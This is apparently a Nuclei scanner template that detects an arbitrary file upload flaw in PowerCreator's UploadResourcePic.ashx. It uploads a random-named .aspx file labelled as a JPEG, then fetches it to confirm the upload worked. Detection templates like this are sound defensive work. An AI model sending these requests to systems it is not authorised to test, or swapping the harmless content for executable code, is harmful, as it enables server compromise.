id: powercreator-uploadresourcepic-ashx-writefile
info:
  name: PowerCreator Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Detects an arbitrary file upload vulnerability in PowerCreator's UploadResourcePic.ashx endpoint.
    This script uploads a harmless temporary file to verify the vulnerability.
  reference:
    - https://xz.aliyun.com/t/8478#reply-15684

variables:
  rand: '{{rand_int(1000, 9999)}}'
  content: '{{rand_text_alpha(8)}}'
  randname: '{{rand_text_alpha(4)}}'

http:
  - id: upload-file
    method: POST
    path:
      - '{{BaseURL}}/upload/UploadResourcePic.ashx?ResourceID={{rand}}'
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
    body: |
      -----------------------------20873900192357278038549710136
      Content-Disposition: form-data; name="file1"; filename="{{randname}}.aspx"
      Content-Type: image/jpeg

      {{content}}
      -----------------------------20873900192357278038549710136--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ".ASPX"
        part: body
    extractors:
      - type: regex
        name: uploaded_path
        part: body
        internal: true
        group: 1
        regex:
          - "(?i)(.+?).ASPX"

  - id: verify-upload
    method: GET
    path:
      - '{{BaseURL}}/ResourcePic/{{uploaded_path}}.ASPX'
    matchers:
      - type: status
        status:
          - 200
